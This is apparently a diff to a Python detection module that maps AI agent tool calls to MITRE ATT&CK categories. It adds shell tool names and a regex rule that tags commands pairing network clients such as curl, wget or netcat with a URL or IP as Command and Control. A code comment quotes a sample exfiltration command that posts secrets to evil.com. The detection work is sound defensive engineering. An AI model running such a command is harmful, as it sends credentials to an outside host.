@@ -15,6 +15,7 @@ stay for display.
 from __future__ import annotations
 
 import json
+import re
 from typing import Any
 
 
@@ -54,7 +55,10 @@ _TOOL_MAP: dict[str, dict[str, str]] = {
         "run_command": _EXECUTION,
         "run_terminal_cmd": _EXECUTION,
         "run": _EXECUTION,  # shell.run
+        "run_shell": _EXECUTION,  # opensre
         "shell": _EXECUTION,
+        "shell_exec": _EXECUTION,
+        "execute_command": _EXECUTION,
         "exec": _EXECUTION,
         "terminal": _EXECUTION,
         "bash": _m("TA0002", "Execution", "T1059.004", "Unix Shell"),
@@ -114,6 +118,20 @@ _CREDENTIAL_PATTERNS = (
     "secrets.yaml", "secrets.yml",
 )
 
+# Shell-wrapped network egress. `bash: curl -d @secrets https://evil.com` is a
+# network connection, so it is Command and Control, not merely Execution. The
+# tool name alone cannot see this: the tool is "Bash", and the egress lives in
+# the arguments. Without this, the most common exfil path (curl from a shell)
+# never earns TA0011 and the credential-exfil sequence rule cannot fire.
+#
+# This tags a *fact* about one event (it talked to the network). Exfiltration
+# itself stays a sequence signal, decided by the detection rules.
+_NETWORK_CLIENT = re.compile(
+    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod|nc|netcat|scp|rsync|ftp|telnet)\b"
+)
+_NETWORK_TARGET = re.compile(r"https?://|\b(?:\d{1,3}\.){3}\d{1,3}\b")
+_C2 = _m("TA0011", "Command and Control", "T1071.001", "Web Protocols")
+
 
 def _evidence_text(evidence: Any) -> str:
     if not evidence:
@@ -143,6 +161,9 @@ def get_mitre_mapping(
             return _PRIVATE_KEY
         if any(p in text for p in _CREDENTIAL_PATTERNS):
             return _CREDENTIAL_ACCESS
+        # A shell that reaches the network is C2, whatever the tool is called.
+        if _NETWORK_CLIENT.search(text) and _NETWORK_TARGET.search(text):
+            return _C2
 
     # 2. Tool-name mapping on the method segment (the part after the last '.'),
     #    normalized so Cursor/Claude/driver spellings all land on one entry.
